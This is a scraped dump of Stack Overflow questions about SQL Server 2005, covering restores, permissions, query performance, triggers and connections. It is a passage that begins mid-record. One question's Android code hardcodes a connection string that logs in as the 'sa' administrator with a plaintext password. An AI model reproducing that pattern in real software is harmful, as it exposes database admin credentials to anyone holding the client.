[dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'IT', 3, N'Cambio automatico')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'NL', 3, N'Automatisch')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'PL', 3, N'Automatyczna')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'PT', 3, N'Automático')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'TR', 3, N'Otomatik')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'B', N'CA', 2, N'2 portes')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'B', N'CS', 2, N'2dveřový')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'B', N'DA', 2, N'2-dørs')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'B', N'DE', 2, N'2-Türen')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'B', N'EL', 2, N'2-πόρτο')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'B', N'EN', 2, N'2-Door')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'B', N'ES', 2, N'2-puertas')\n</code></pre>\n"},{"tags":["c#","unit-testing","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":95,"score":3,"question_id":12177818,"title":"Avoid restore stuck when restoring SQL server under unittesting","body":"<p>I am currently building unit tests that tests if some classes are editing a sql server 2005 database correctly. To do this I have created a small subset of data from our production and are storing it as a backup file. Whenever a unit test needs to be sure it has a clean database state it calls a restore routine that basically call the following sql:</p>\n\n<pre><code>RESTORE DATABASE database FROM DISK = 'c:\\test\\backup.bak' WITH REPLACE, NORECOVERY\n</code></pre>\n\n<p>This normally works, and has decent speed. When I say normally it's because sometimes the database gets stuck in 'restore' mode result in error messages that looks like this (assuming it's a Alter command):</p>\n\n<pre><code>ALTER DATABASE is not permitted while a database is in the Restoring state.\n</code></pre>\n\n<p>This means that if the first fail, every test fails. I can get the database out of it stuck state, but it's rather irritating to do it every single time, it's very time consuming and the whole point of unit testing was so I didn't need anything when I activate the test.</p>\n\n<p>I tried to see if I could avoid it by the RESTORE syntax, but can't kind any options or flags that sound like it could resolve the issue. </p>\n\n<p>Is there any other method I could use that is a lot safer that the RESTORE command?</p>\n\n<p><strong>Update:</strong>\nI discovered that the restore fail happens mostly when a connection was still active. I usually handled that issue with the following structure:</p>\n\n<pre><code>ALTER DATABASE MyDatabase SET Single_User WITH Rollback Immediate\n\n-- Restore logic here\n\nALTER DATABASE MyDatabase SET Multi_User\n</code></pre>\n\n<p>The problem with this is that it only limits all the connections to one. Sometimes one of the connections that is forced to close jumps over to the only one free, disrupting the restore and making it fail (or that is what I can gather from the documents and pages I have been reading).</p>\n\n<p>I am instead trying to do the following SQL command before I start on my restore logic:</p>\n\n<pre><code>Declare @spid int\nSelect @spid = min(spid) from master.dbo.sysprocesses\nwhere dbid = db_id('Mydatabase')\nWhile @spid Is Not Null\nBegin\n        Execute ('Kill ' + @spid)\n        Select @spid = min(spid) from master.dbo.sysprocesses\n        where dbid = db_id('Mydatabase') and spid &gt; @spid\nEnd\n\n-- Do Restore Logic\n</code></pre>\n\n<p><a href=\"http://geekswithblogs.net/AngelEyes/archive/2010/02/24/kill-connections-to-resote-db---sql-server.aspx\" rel=\"nofollow\">http://geekswithblogs.net/AngelEyes/archive/2010/02/24/kill-connections-to-resote-db---sql-server.aspx</a></p>\n\n<p>This section of code goes in and actively closes all connections, which gives the restore logic room to execute. I am, however, not entirely sure that this is the best way to go, simply because it does not prevent connections to reestablish, potentially disrupting the restore process again. But so far I haven't seen evidence that this has happened yet.</p>\n"},{"tags":["sql-server","sql-server-2005","create-table"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":595,"score":0,"question_id":4596187,"title":"How can I restrict CREATE TABLE access for a user to a specific schema (sql server)?","body":"<p>I'd like to allow some users to create tables in a particular schema, but not be able to create tables in other schemas. How can I achieve this? </p>\n\n<p>I see the <a href=\"http://msdn.microsoft.com/en-us/library/ms174979%28SQL.90%29.aspx\" rel=\"nofollow\">CREATE TABLE</a> help says </p>\n\n<blockquote>\n  <p>Requires CREATE TABLE permission in the database and ALTER permission on the schema in which the table is being created.</p>\n</blockquote>\n\n<p>Does that mean I can give ALTER permission to the schema and restrict ALTER permissions on all other schemas? </p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":60,"score":2,"question_id":12375287,"title":"How to copy data from SQL query analyzer results","body":"<p>I am inserting stack trace of exception into table.But When I execute select query for that table from sql query analyzer then I dont see complete stack trace in it.\nHere is the code..</p>\n\n<pre><code>DataAccess.ExecuteNonQuery(\n    conn, \n    \"usp_insert_error_detail\", \n    iproductType, \n    \"error\", \n    ex.Message.ToString(), \n    ex.StackTrace.ToString());\n</code></pre>\n"},{"tags":["sql","sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12386646,"title":"Execute a result in  SQL Server using a stored procedure","body":"<p>I need to execute result (already in form of SQL) itself of an SQL query to get the final result.</p>\n\n<p>So, it should be like, in first query I execute</p>\n\n<pre><code>Select Top(1) RequiredQuery as ReqQry from EPMaster \n</code></pre>\n\n<p>I'll get another query in result in <code>ReqQry</code> that will then be executed in form another query to get the final result. </p>\n\n<p>The second query will also require some parameters to be passed at where clause, like when I do:</p>\n\n<pre><code>Select Top(1) RequiredQuery as ReqQry \nfrom EPMaster \n--ReqQry after its execution returns:\nSelect Top(1) (FirstName + ' ' + LastName) as FullName \nfrom DPMaster \nwhere DmID = @DomainID and PnID = @PersonID\n</code></pre>\n\n<p>I'll be passing the Params <code>@DomainID</code> and <code>@PersonID</code> from my C# project's DAL layer.</p>\n\n<p>So I guess it should be done with the help of a stored procedure.</p>\n\n<p>-----------------More Explanation-------------</p>\n\n<p>Here, one SQL statement is executed to get the next SQL statement which will be the resultant of the former statement. When you execute 1st query, you get 2nd query in result, which you execute again to get the final result</p>\n\n<p>The second query needs 2 parameters to execute that are <code>@DomainID</code> and <code>@PersonID</code> which will be passed by me from my C# Project. So, if I make a stored procedure for handeling all this and pass the required parameters, along with the 1'st query from my project, it should first execute 1st query then execute 2nd query (with parameters <code>PersonID</code> and <code>DomainID</code>) that was received as result of 1st query, after which I get the final result.</p>\n"},{"tags":["android","eclipse","sql-server-2005","jdbc"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12374896,"title":"getting error when trying to connect to a database using JDBC and Eclipse for Android","body":"<p>I'm trying to connect to a database from my android using JDBC and Eclipse IDE and Java</p>\n\n<p>this is the code I wrote </p>\n\n<pre><code>package Android_SQL.Package;\n\nimport java.sql.Connection;\nimport java.sql.Driver;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.util.Properties;\n\nimport Android_SQL.Package.R;\nimport android.app.Activity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.view.View.OnClickListener;\nimport android.widget.Button;\nimport android.widget.Toast;\nimport android.util.Log;\n\npublic class Android_SQLActivity \nextends Activity \nimplements OnClickListener\n{\n    /** Called when the activity is first created. */\n    @Override\n    public void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.main);\n\n        Button My_Button = (Button) this.findViewById(R.id.button1);\n        My_Button.setOnClickListener(this);        \n    }\n\n\n    @Override\n    public void onClick(View arg0) {\n\n        (new Thread(new Runnable() \n        {\n            @Override\n            public void run() \n            {\n                // Connect\n                try {               \n                    String cs = \"jdbc:sqlserver://192.168.0.29:1433;databaseName=ODB0336;user=sa;password=savage\";\n                    Class.forName(\"com.microsoft.sqlserver.jdbc.SQLServerDriver\");        \n                    Connection con = DriverManager.getConnection(cs);\n                    //String sql=\"insert into Categories(CategoryName, Description) values(?,?)\";\n                    String sql=\"insert into Colors(ColorId, ColorEName, ColorName) values(?,?,?)\";\n                    PreparedStatement prepared = con.prepareStatement(sql);\n                    prepared.setString(1, \"ABCD\");\n                    prepared.setString(2, \"ABCDEF\");\n                    prepared.setString(2, \"XYZ\");                   \n                    prepared.executeUpdate();           \n                } catch (Exception e) \n                {\n                    e.printStackTrace();\n                    Log.i(\"Error\", e.getMessage());\n                }\n\n            }\n        }\n        )\n        ).start();                      \n    }\n}\n</code></pre>\n\n<p>but I'm getting the following exception when i connect :</p>\n\n<p>\"com.microsoft.sqlserver.jdbc.SQLServerException: recvfrom failed: ECONNRESET (Connection reset by peer)\"</p>\n\n<p>how to fix it? what is the problem.</p>\n\n<p>the JDBC version is : Microsoft SQL Server JDBC Driver 3.0</p>\n\n<p>Please help.</p>\n"},{"tags":["database","sql-server-2005","backup"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12386273,"title":"error with creating backup of Godaddy DB on Local Machine","body":"<p>I am in need of restoring My Updated Database on GoDaddy.</p>\n\n<p>I had old database backup(ypldb.bak) from Godaddy. The backup(ypldb.bak) had been created from Godaddy hosting account.</p>\n\n<p>I had to do some update on this database backup file.\nSo I restored this backup file on my Local Machine [SqlServer 2005]. And done the Update.</p>\n\n<p>Now I want to create backup of this updated database which is on my local machine, so that i can restore newly created backup file on go daddy hosting account.</p>\n\n<p>but during the creation of backup on local machine it giving error.\nThe error is–</p>\n\n<pre><code>TITLE: Microsoft SQL Server Management Studio Express\n------------------------------\n\nBackup failed for Server 'ARCHANA-PC'.  (Microsoft.SqlServer.Express.Smo)\n\nFor help, click: http://go.microsoft.com/fwlink?ProdName=Microsoft+SQL+Server&amp;ProdVer=9.00.2047.00&amp;EvtSrc=Microsoft.SqlServer.Management.Smo.ExceptionTemplates.FailedOperationExceptionText&amp;EvtID=Backup+Server&amp;LinkId=20476\n\n------------------------------\nADDITIONAL INFORMATION:\n\nSystem.Data.SqlClient.SqlError: Failed to pause catalog for backup. Backup was aborted. (Microsoft.SqlServer.Express.Smo)\n\nFor help, click: http://go.microsoft.com/fwlink?ProdName=Microsoft+SQL+Server&amp;ProdVer=9.00.2047.00&amp;LinkId=20476\n\n------------------------------\nBUTTONS:\n\nOK\n------------------------------\n</code></pre>\n\n<p>I tried to find solution from following link but didn't find any useful solution\n<a href=\"http://social.msdn.microsoft.com/Forums/en-US/sqlkjmanageability/thread/77f9921d-338d-49f0-addb-5e11178f4ab9/\" rel=\"nofollow\">http://social.msdn.microsoft.com/Forums/en-US/sqlkjmanageability/thread/77f9921d-338d-49f0-addb-5e11178f4ab9/</a></p>\n\n<p>suggest me some useful solution so I can try to take database backup as soon as possible</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":12377770,"title":"Calling a function on distinct values from table","body":"<p>I've got a SQL Server 2005 database.  I need to get distinct values in addition to calling a function on those distinct values.  I'm not sure how the distinct works when there is a function call involved.  For example, I have this query:</p>\n\n<pre><code>SELECT DISTINCT a, b, c, fcn_DoSomething(a, b, c) AS z FROM users\n</code></pre>\n\n<p>I'm guessing that the function (fcn_DoSomething) is being called for all of the values in the table, not the distinct values.  Am I correct?  If so, how can I write the query to call the function only on distinct values of a,b,c?  I know one option is to use a temporary table, but if anyone has better ideas that would be great.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql","sql-server","sql-server-2005",".net-assembly"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12376307,"title":"Create assembly in SQL Server","body":"<p>I keep getting the following error:</p>\n\n<pre><code>Msg 10314, Level 16, State 11, Line 1\nAn error occurred in the Microsoft .NET Framework while trying to load assembly id 66079. The server may be running out of resources, or the assembly may not be trusted with PERMISSION_SET = EXTERNAL_ACCESS or UNSAFE. Run the query again, or check documentation to see how to solve the assembly trust issues. For more information about this error: \nSystem.IO.FileLoadException: Could not load file or assembly 'ncestablegenerator, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. The given assembly name or codebase was invalid. (Exception from HRESULT: 0x80131047)\nSystem.IO.FileLoadException: \n   at System.Reflection.Assembly._nLoad(AssemblyName fileName, String codeBase, Evidence assemblySecurity, Assembly locationHint, StackCrawlMark&amp; stackMark, Boolean throwOnFileNotFound, Boolean forIntrospection)\n   at System.Reflection.Assembly.InternalLoad(AssemblyName assemblyRef, Evidence assemblySecurity, StackCrawlMark&amp; stackMark, Boolean forIntrospection)\n   at System.Reflection.Assembly.InternalLoad(String assemblyString, Evidence assemblySecurity, StackCrawlMark&amp; stackMark, Boolean forIntrospection)\n   at System.Reflection.Assembly.Load(String assemblyString)\n</code></pre>\n\n<p>This is the creation of my assembly:</p>\n\n<pre><code>CREATE ASSEMBLY [NCESTableGenerator]\nAUTHORIZATION [dbo]\nfrom 'C:\\SqlDlls\\NCESTableGenerator.dll'\nWITH PERMISSION_SET = UNSAFE\nGO\n</code></pre>\n\n<p>Any ideas? There is plenty of space on the server.</p>\n"},{"tags":["query","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":12373440,"title":"Optional where clause using ISNULL","body":"<p>I have stored procedures take multiple parameters (up to 7 or 8 in some cases) to be used to filter down the result set.  These parameters are optional (default <code>NULL</code>).  All non-NULL values passed in are to be used in the filter (i.e. it's boolean <code>and</code> instead of boolean <code>or</code>).</p>\n\n<p>These queries usual end up looking like this...</p>\n\n<pre><code>SELECT *\nFROM [MyTable]\nWHERE (@Param1 IS NULL OR (@Param1 IS NOT NULL AND [Field1] = @Param1))\n      AND (@Param2 IS NULL OR (@Param2 IS NOT NULL AND [Field2] = @Param2))\n      AND (@Param3 ...\n</code></pre>\n\n<p>I'm aware that this is very inefficient, but due to the number of parameters it just isn't possible split them into individual queries.</p>\n\n<p>So instead I tried doing the following...</p>\n\n<pre><code>SELECT *\nFROM [MyTable]\nWHERE [Field1] = ISNULL(@Param1, [Field1])\n      AND [Field2] = ISNULL(@Param2, [Field2])\n      AND [Field3] ...\n</code></pre>\n\n<p>However, the problem occurs when a field contains <code>NULL</code> and therefore the <code>=</code> operator simply doesn't work.</p>\n\n<p>Is there a simple and efficient way of doing this so I can have a single query, using multiple \"filter\" parameters?  I'd prefer not to use dynamic SQL if at all possible.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":215,"score":0,"question_id":5045311,"title":"Transaction Log in Sql Server","body":"<p>For what statements DDL or DML, Transaction log is maintained and Why?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":12373780,"title":"MSSQL Speed Up Query 365 Millon Rows","body":"<p>I have roughly 365 Million Rows inside my tables and each day we add an additional Million rows after the data is a year old it gets moved to a different table that archives our data. </p>\n\n<p>I have a PK Clustered index on DataCollectionID.</p>\n\n<p>I have one other index: a Unique Nonclusted index on AssetID, DataPointID, and DatapointDate</p>\n\n<p>I need to run multiple select queries against the table pretty quickly... here is my select Query:</p>\n\n<pre><code>SELECT [DataPointID]\n  ,[SourceTag]\n  ,[DatapointDate]\n  ,[DataPointValue]\nFROM DataCollection\nWhere \n  DatapointDate &gt;= '2012-09-07' AND \n  DatapointDate &lt; '2012-09-08' AND\n  DataPointID = 1100\nORDER BY DatapointDate\n</code></pre>\n\n<p>This query should return 8,640 rows which it does but it takes 00:00:08 (8 seconds) to execute. Even if I said give me top 10 it still takes 8 seconds. Can someone please help me speed up this process?</p>\n"},{"tags":["c#",".net","sql-server","sql-server-2005","signalr"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":134,"score":4,"question_id":12371805,"title":"Push data from Sql Server to desktop application","body":"<p>I have a pretty simple .net 4 desktop application written in c# which needs to display some data inserted to a table on an SQL Server (2005). The data itself is quite simple, just one row of about 10 columns, (mostly counts of other data).</p>\n\n<p>I could just poll the sql server from the application every x interval, but my preference is to have the sql server push the data out to this application if possible, as the timing of the \"new data\" is often irregular.</p>\n\n<p>In short, I'd like to know if this is possible. Doing some research before posting this question, I found a few possibilities.</p>\n\n<p>1) SignalR: I found <a href=\"http://stackoverflow.com/questions/11001205/pushing-data-from-sql-server-to-web-application-with-signalr\">this</a> question which seemed promising, but this seems to be in the context of a web application rather than a desktop one. Upon review of the signalR wiki, it seemed to me that it requires some kind of web service or other http connection which I'd prefer to avoid.</p>\n\n<p>2) Sql server change tracking, from <a href=\"http://stackoverflow.com/questions/6297392/what-is-the-best-way-to-push-inserted-data-out-of-sql-server-to-an-application\">this</a> question. Firstly, I'm not on sql 2008 so I assume I'd have to install or configure it (which isn't a problem) but I'm also not sure if this will provide what I need.</p>\n\n<p>I will mention as well that this client application could exist on 100+ different pcs which would all need to be notified on the data change.</p>\n\n<p>So, is such a thing possible? I apologize if the question is a little vague - and thanks in advance for your help!</p>\n"},{"tags":["c#","asp.net","sql-server-2005","iis","connection-string"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12372000,"title":"I cannot display data from sql server 2005 express on an ASP.net website running from IIS windows 7","body":"<p>I am using Microsoft server 2003 running sql server 2005 which I have added an asp.net website on IIs.This works perfect. I can display the website on the browser and also read information from the sql server. My problem now arises when I want to do exactly the same but with my laptop which is running sql server 2005 express on windows 7. the websites displays just fine on the localhost but when I login it gives me an error saying that it cannot read files.\nSo my question is that is there a difference between sql server connectionstring and sql server express connection string? or the error is not connectionstring related?</p>\n"},{"tags":["sql","sql-server-2005","tsql"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":950,"score":2,"question_id":3752942,"title":"How to check when autogrowth is done last?","body":"<p>In sql server 2005, the autogrowth is enabled by size. \nIs there any way to check when autogrowth on data and log file happened last?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","triggers"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12143180,"title":"On Update trigger report Variance","body":"<p>I am working on building an alert mechanism system,where when the data in the table is updated an email is triggered to the specific users. The following trigger is working and when data is updated in the system the email is triggered.</p>\n\n<pre><code>ALTER TRIGGER [dbo].[AlertTest]\nON [dbo].[Tbl]\nFOR UPDATE\nAS\n\nDECLARE @xml NVARCHAR(MAX)\nDECLARE @body NVARCHAR(MAX)\n\n\nSET @xml = CAST(( SELECT [No] AS 'td','',[ date] AS 'td','',\n   [lag] AS 'td','', Percentage AS 'td'\nFROM  Tbl\nwhere  \nORDER BY SlNo \nFOR XML PATH('tr'), ELEMENTS ) AS NVARCHAR(MAX))\n\n\nSET @body ='&lt;html&gt;&lt;body&gt;&lt;H3&gt;Report&lt;/H3&gt;\n&lt;table border = 1&gt; \n&lt;tr&gt;\n&lt;th&gt; No &lt;/th&gt; &lt;th&gt; date &lt;/th&gt; &lt;th&gt; lag &lt;/th&gt; &lt;th&gt; Percentage &lt;/th&gt;&lt;/tr&gt;'    \n\n\nSET @body = @body + @xml +'&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;'\n\n\nEXEC msdb.dbo.sp_send_dbmail\n@profile_name = 'Alert Email', -- replace with your SQL Database Mail Profile \n@body = @body,\n@body_format ='HTML',\n@recipients = 'abc@gmail.com', -- replace with your email address\n@subject = 'Report' ;\n</code></pre>\n\n<p>The data in the table is of the following format</p>\n\n<pre><code>  No    Date    Days    Percentage\n   1    17-Aug-12   2   -0.34%\n   2    3-Aug-12    15  -29.39%\n   3    27-Jul-12   22  12.02%\n   4    20-Jul-12   29  -0.64%\n   5    13-Jul-12   36  -3.45%\n   6    6-Jul-12    43  -99.93%\n   7    29-Jun-12   50  41.26%\n</code></pre>\n\n<p>I wish to add in a condition and pass it externally for the percentage field where for example:\n1>  The variance is 5 -10% it should select only those values and send as email.\n2>  If the variance is 0.5-1.6% it should select only those values and send in the report.\nKindly advise how this may be achieved?</p>\n\n<p>Thanks</p>\n"},{"tags":["c#","sql","sql-server-2005","sharepoint"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12370944,"title":"The tail of the log for the database \"DBName\" has not been backed up","body":"<p>I tried to restore Database using following query:</p>\n\n<blockquote>\n  <p>ALTER DATABASE [DatabaseName] SET Single_User WITH Rollback Immediate GO</p>\n  \n  <p>RESTORE DATABASE DatabaseName FROM DISK = 'C:\\DBName-Full Database\n  Backup'</p>\n  \n  <p>ALTER DATABASE [DatabaseName] SET Multi_User GO</p>\n</blockquote>\n\n<p>but instead of restoring Database am getting this error,</p>\n\n<blockquote>\n  <p>Msg 3159, Level 16, State 1, Line 2 The tail of the log for the\n  database \"DatabaseName\" has not been backed up. Use BACKUP LOG WITH\n  NORECOVERY to backup the log if it contains work you do not want to\n  lose. Use the WITH REPLACE or WITH STOPAT clause of the RESTORE\n  statement to just overwrite the contents of the log. Msg 3013, Level\n  16, State 1, Line 2 RESTORE DATABASE is terminating abnormally.</p>\n</blockquote>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12368448,"title":"Drop all extended properties on SQL Server","body":"<p>How to drop all extended properties on SQL Server in a scriptable way?</p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":12363441,"title":"How to change SQL Server 2005 from Windows Authentication to SQL Authentication?","body":"<p>I have installed SQL Server 2005 in Windows Authentication, now I want to change it to SQL Authentication.\nHowever, I cannot reinstall SQL SERVER and Management again, because it will lose the data in it.\nAlso I want to know what changes do I need to make in my Connection class to open connection, as my current is  </p>\n\n<pre><code>public SqlConnection con= new sqlConnection(\"server=.\\\\SQLEXPRESS;database=Restaurant;integrated security=sspi\");\n</code></pre>\n\n<p>Just need to ask one more thing, I can see my database in WIndows Auth and in SQL auth, so how can i change, so that any other user need to login before it peeps into my database. thanks</p>\n"},{"tags":["asp.net-mvc","sql-server-2005","excel","csv"],"answer_count":2,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":1602,"score":5,"question_id":1559392,"title":"Best method for importing csv or excel file to SQL Server 2005 using .net MVC view","body":"<p>I'm looking for the best method for importing csv or excel file to SQL Server 2005 using .net MVC.</p>\n\n<p>Thank you.</p>\n"},{"tags":["sql-server","sql-server-2005","database-connection","sapb1"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3125,"score":1,"question_id":361062,"title":"When connecting SAP Business One to SQL Server 2005, what is the","body":"<p>we have SAP Business One - Fourth Shift Edition running here at a small manufacturing company.  The consulting company that has come in to do the installation/implementation uses the \"sa\" id/pass to initially connect to the database to get the list of companies.  From then on, I have to assume that its the sa id/pass that is being used to connect the client software to the database.  Is this appropriate?  I dont know where this data is being stored... as an ODBC connection?  directly in the registry somewhere?  Is it secure?  Would it be better to set the users network ID in the database security and then use the \"trusted connection\" setting instead?  Or do most people create a separate login in the database for each user and use that in the client settings?</p>\n\n<p>seems like the easiest way would be to add the users network login to the sql server security so they can use the \"trusted connection\"... but then wouldn't that allow ANY software to connect to the database from that machine?</p>\n\n<p>So anyways: what are the best-practices for setting this up?</p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12357803,"title":"SSIS 2005 problems importing to nvarchar(max)","body":"<p>I have some XML files that I do a weekly import from for one of our systems. Four of the pieces of data in the XML range from 450 to 650 characters in length. I have tried everything I can think of but they always get truncated at around 255 characters. I tried setting the landing column to nvarchar(max), varchar(max), varchar(1000) and varchar(600) and none of this worked and I still get the same truncation. I inspected the XML files and the data there looks good. All the rest of the data comes in without truncation - just these four items have issues. I did find out googling around that SSIS considers nvarchar(max) and varchar(max) blob fields so I assume that is why they do not work correctly - but the others ??</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","gaps-and-islands"],"answer_count":2,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":1227,"score":6,"question_id":2693171,"title":"Finding gaps (missing records) in database records using SQL","body":"<p>I have a table with records for every consecutive hour. Each hour has some value. I want a T-SQL query to retrieve the missing records (missing hours, the gaps). So for the DDL below, I should get a record for missing hour 04/01/2010 02:00 AM (assuming date range is between the first and last record). Using SQL Server 2005. Prefer a set based query.</p>\n\n<pre><code>DDL:\nCREATE TABLE [Readings](\n    [StartDate] [datetime] NOT NULL,\n    [SomeValue] [int] NOT NULL\n)\nINSERT INTO [Readings]([StartDate], [SomeValue])\nSELECT '20100401 00:00:00.000', 2 UNION ALL\nSELECT '20100401 01:00:00.000', 3 UNION ALL\nSELECT '20100401 03:00:00.000', 45\n</code></pre>\n"},{"tags":["sql","sql-server","database","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12356765,"title":"How to display null if a field's where condition is not met","body":"<p>I've got the following SQL code which returns the tables in my database, along with the primary key field in each table.</p>\n\n<pre><code>SELECT Keys.TABLE_NAME As 'Table Name',\nKeys.COLUMN_NAME AS 'Primary Key'\nFROM INFORMATION_SCHEMA.TABLE_CONSTRAINTS AS Constraints\nJOIN INFORMATION_SCHEMA.KEY_COLUMN_USAGE AS Keys\nON Constraints.TABLE_NAME = Keys.TABLE_NAME\nAND Constraints.CONSTRAINT_NAME = Keys.CONSTRAINT_NAME\nWHERE Constraints.CONSTRAINT_TYPE = 'PRIMARY KEY'\n</code></pre>\n\n<p>As it is, it only displays those tables which have a primary key.  How can I modify the sql to display all tables, and those tables which do not have a primary key will display \"null\" in the \"Primary Key\" column instead?</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":369,"score":0,"question_id":4119971,"title":"SQL Server 2005 - How do I find out the disk size of a specific index","body":"<p>How do you find the disk size of a specific index in sql server 2005?</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":63,"score":-1,"question_id":12347826,"title":"Special characters in LIKE statement","body":"<p>I am looking to perform the following in SQL Server 2005 but I guess due to the character '#' the <code>LIKE</code> statement does not seem to be returning any result.</p>\n\n<pre><code>SELECT * FROM Table WHERE keyword LIKE '%C#%'\n</code></pre>\n\n<p>Please advice.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":66,"score":1,"question_id":12346791,"title":"Multiple replacements in string in single Update Statement in SQL server 2005","body":"<p>I've a table 'tblRandomString' with following data:</p>\n\n<pre><code>ID  ItemValue\n\n1   *Test\"\n2   ?Test*\n</code></pre>\n\n<p>I've another table 'tblSearchCharReplacement' with following data</p>\n\n<pre><code>Original   Replacement\n\n*          `star`\n?          `quest`\n\"          `quot`\n;          `semi`\n</code></pre>\n\n<p>Now, I want to make a replacement in the ItemValues using these replacement.\nI tried this:</p>\n\n<pre><code>Update T1\nSET ItemValue = select REPLACE(ItemValue,[Original],[Replacement])\nFROM dbo.tblRandomString T1\nJOIN\ndbo.tblSpecialCharReplacement T2\nON T2.Original IN ('\"',';','*','?')\n</code></pre>\n\n<p>But it doesnt help me because only one replacement is done per update.</p>\n\n<p>One solution is I've to use as a CTE to perform multiple replacements if they exist.</p>\n\n<p>Is there a simpler way?</p>\n"},{"tags":["sql-server-2005","split","microsoft","sql-view","c5"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12346829,"title":"SQL For splitting Zip and City field in Microsoft C5","body":"<p>I have a customer who is running Microsoft C5 as their ERP System, and we are supposed to help them get it integrated to their CRM System. For that i have created an SQL view where i map the fields needed for importing customers according to our import program's standard. The problem is that this version of microsoft C5 stores Zip code and city in the same field, so i need to split it up into a zip field and a city field. The problem is that there isn't really a common pattern of how many whitespaces between zipcode and city, and the zipcodes aren't equally long and so forth. i have tried many string functions, but i bet it's piece of cake to solve if you just know how.</p>\n\n<p>Here are some examples of values in the zipcity collumn i need to split:</p>\n\n<pre><code>D-40883  Ratingen\nN-4300  Sandnes\nS-55117  Jönköping\n3650  Ølstykke\nPL - 58-100 swidnica dlaska\n</code></pre>\n\n<p>As you see, here we got a mix of german, danish, norwegian, swedish and polish zipcodes an citynames. This is what i need to have splitted. </p>\n\n<p>I Don't know whether i should try with a regular expression? I am not very skilled in using regular expressions, so help would be much appreciated.</p>\n"},{"tags":["sql","tsql","sql-server-2005","gaps-and-islands"],"answer_count":2,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":635,"score":3,"question_id":3609687,"title":"Iterating through dates in SQL","body":"<p>I have a table of data that looks a bit like this:</p>\n\n<pre><code>Name    StartTime              FinishTime              Work\nBob     2010-08-03 08:00:00    2010-08-03 12:00:00     4\nBob     2010-08-03 13:00:00    2010-08-03 16:00:00     3\nPete    2010-08-04 08:00:00    2010-08-04 12:00:00     4\nMark    2010-08-04 10:00:00  